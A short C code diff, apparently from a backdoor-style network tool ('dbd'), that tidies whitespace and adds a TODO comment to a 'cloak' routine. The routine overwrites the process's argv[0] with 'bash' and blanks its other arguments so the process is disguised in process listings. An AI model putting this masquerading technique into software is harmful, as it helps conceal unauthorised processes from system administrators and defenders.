@@ -289,16 +289,21 @@ int main(int argc, char **argv) {
     if(cloak)
     {
         #ifdef WIN32
-        //stub              
+        //stub
         #else
-        //change argv[0] to say bash       
+	/*
+	@TODO: Update this from being an example to something workable.
+		- Process name should be configurable through dbd.h or environment vars
+		- We should do getopt BEFORE this, and then overwrite all of argv after we're ready to run
+	*/
+        //change argv[0] to say bash
         int scrub;
         strncpy((char *)argv[0], "\0", strlen((char *)argv[0]) + 1);
-        strcpy((char *)argv[0], "bash\0");    
+        strcpy((char *)argv[0], "bash\0");
         for (scrub = 1; scrub < argc; scrub++)
-        {                     
+        {
              strncpy((char *)argv[scrub], "\0", strlen((char *)argv[scrub]) + 1);
-        }                 
+        }
         #endif
     }
 
